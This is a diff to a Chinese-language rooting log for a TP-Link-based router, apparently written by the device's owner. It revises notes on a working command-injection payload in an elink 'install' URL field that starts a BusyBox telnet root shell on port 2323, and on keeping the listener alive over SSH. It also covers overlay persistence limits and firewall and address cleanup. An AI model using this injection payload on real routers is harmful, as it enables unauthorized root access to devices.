@@ -131,17 +131,38 @@ netsh advfirewall firewall add rule name=WTA_SRV   dir=in action=allow protocol=
 ```python
 PAYLOAD = 'http://192.168.1.100:8099/x;(/bin/busybox telnetd -l /bin/sh -p 2323 >/dev/null 2>&1 &);'
 # 起 srv.py --root <含文件 x 的目录> --port 8099
-# 起 elink_gw4.py 900 ctcapd.appd install '{"url":"<PAYLOAD>"}'
+# 起 elink_gw4.py <寿命秒> ctcapd.appd install '{"url":"<PAYLOAD>"}'
 ```
 
-⚠️ 必须用 `DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP` 启动（`Start-Process -WindowStyle Hidden`
-实测启动即退，子进程没活下来）。参考实现：`work/net/getroot.py` 的 `spawn()`。
+> ⚠️ **2026-11-07 二次更正（推翻了本文档上一版的说法）**
+>
+> 上一版写「必须用 `DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP` 启动」，
+> **这是错的**。Windows OpenSSH 在会话结束时会把该会话派生的**整个进程树**杀掉
+> （sshd 把它们放进 job object），`DETACHED_PROCESS` 也逃不掉。
+>
+> 症状：`elink_gw4.log` 里只有一行 `### listen 32768 for 900s`，
+> 然后永远没有 `accept`。而我的 SSH 命令早就返回了，
+> 所以每次都是「监听已死 + 设备来了没人接」。
+>
+> **正确做法：把 srv + elink + 「轮询 2323」放进同一个进程、同一条 SSH 会话。**
+> 父进程活着 = SSH 活着 = 子进程活着。
+> 参考实现：`work/net/run_all.py`（本轮实测 9 秒命中）。
 
-**第 4 步：等它自己回连（约 4 分钟一轮）**
+**第 4 步：等它自己回连**
 
 ```python
 socket.create_connection(('192.168.1.175', 2323)).recv()   # 出现 BusyBox banner 即成功
 ```
+
+> **回连间隔实测：快到「秒级」量级，不是「约 4 分钟一轮」。**
+>
+> 本轮修正了一个统计假象：`elink_gw4.log` 里两次 `accept` 相隔 35 分 39 秒
+> （`00:47:46` → `01:23:25`），我因此一度推断周期是 36 分钟 —— **错**。
+> 真实原因是那期间监听根本没活过（见第 3 步的 job object 问题），
+> 设备想连也连不上。
+>
+> 一旦监听真正活着，实测 **9 秒**就命中（`run_all.py`）。
+> ⇒ 不要按「要等半小时」去设计，按「监听必须在窗口期活着」去设计。
 
 ### 2.4 成功证据（`[本板实证]` 原文）
 
@@ -187,24 +208,52 @@ lo      inet addr:127.0.0.1
 
 `ctcap` / `ini` / `ipks` / `web` / `www` 是 TP-Link 原厂目录，可确认不是 OpenWrt。
 
-### 2.6 ⚠️ 两个必须知道的限制
+### 2.6 ⚠️ 必须知道的两个限制
 
-1. **这个 root 是临时的。** 本轮是「u-boot 里 `bootm` 把原厂内核从 RAM 拉起」的实例，
-   `mount: /dev/mtdblock7 -> /rom/overlay failed: No such device`，所以：
-   - `/proc` 不完整 → `cat /proc/mtd`、`cat /proc/version`、`ps` 失效，`ifconfig` 部分失效
-   - `/dev/null` 不可写 → `cmd 2>/dev/null` 报 `Read-only file system`
-   - 重启即丢，需要重启后重跑一遍 getroot
-2. **别名用完要清**（不影响上网，但会污染该网段 ARP 语义）：
-   ```powershell
-   Remove-NetIPAddress -IPAddress 192.168.1.1 -PrefixLength 32 -Confirm:$false
-   Remove-NetIPAddress -IPAddress 192.168.0.1 -PrefixLength 32 -Confirm:$false
-   netsh advfirewall firewall delete rule name=WTA_ELINK
-   netsh advfirewall firewall delete rule name=WTA_SRV
-   ```
+**限制一：`/proc` 全不全、`/etc` 能不能持久写，取决于 `rootfs_data` 那 22 MB。**
+
+同一个原厂固件、同一块板，本轮见过两种完全不同的状态（都是原厂 4.4.60）：
+
+| | 状态 A（`/proc` 缺失） | 状态 B（`/proc` 完整） |
+|---|---|---|
+| `cat /proc/mtd` | `No such file or directory` | 15 个分区全列出 |
+| `/dev/mtdblock*` | 不存在 | `mtdblock0..16` 齐全 |
+| `mount` | `no /proc/mounts` | 7 条挂载正常 |
+| `ls /dev` | 只有 `console` 一个 | 完整 |
+| overlay | 没挂上 | `overlayfs on /etc` |
+| root 能否改配置 | 不能 | 能（但见限制二） |
+
+差别就在于 **`/dev/mtdblock7` 能否挂到 `/rom/overlay`**。
+
+**限制二：就算 `/proc` 全了，`/etc` 的写层仍在 tmpfs（RAM），重启即丢。**
+
+```
+overlayfs:/tmp/overlay/root on /etc type overlay (rw, upperdir=/tmp/overlay/root, ...)
+df: overlayfs 16.4M  已用 520K
+```
+
+`upperdir` 在 `/tmp` = tmpfs。原因：`mtd7`（`rootfs_data` 22 MB）上的 UBI 卷名是 **`"0"`**，
+不是原厂 init 期望的 `rootfs_data`，所以原厂没能把它挂成 `/overlay`
+（`cat /sys/class/ubi/ubi0_0/name` → `0`）。
+
+> **这不是我们弄坏的。** `boot_cart2.log`（我们动手**之前**的原厂首次启动）里同样是
+> `UBIFS error: too few LEBs (2), min. is 17` + `jffs2 not ready yet; using ramdisk`。
+> 这台机器的可写分区在我们碰它之前就已经不可用了。
+
+**怎么从 A 恢复到 B（本轮实测有效）**：擦掉 `0x6a00000` 那 22 MB，让原厂重建。
+过程和证据见 `TP-SLOT-HEADER-VERIFIED.md` §7。
+
+**别名用完要清**（不影响上网，但会污染该网段 ARP 语义）：
+```powershell
+Remove-NetIPAddress -IPAddress 192.168.1.1 -PrefixLength 32 -Confirm:$false
+Remove-NetIPAddress -IPAddress 192.168.0.1 -PrefixLength 32 -Confirm:$false
+netsh advfirewall firewall delete rule name=WTA_ELINK
+netsh advfirewall firewall delete rule name=WTA_SRV
+```
 
 ### 2.7 对「普通用户能不能用」的结论不变
 
-步骤 1 要管理员权限、步骤 3 要跑 Python、还要抓准 4 分钟的窗口。
+步骤 1 要管理员权限、步骤 3 要跑 Python、还要保证监听跨会话存活。
 **这是技术用户的路径，不是普通用户路径。** 可行性矩阵见 §4。
 
 ---
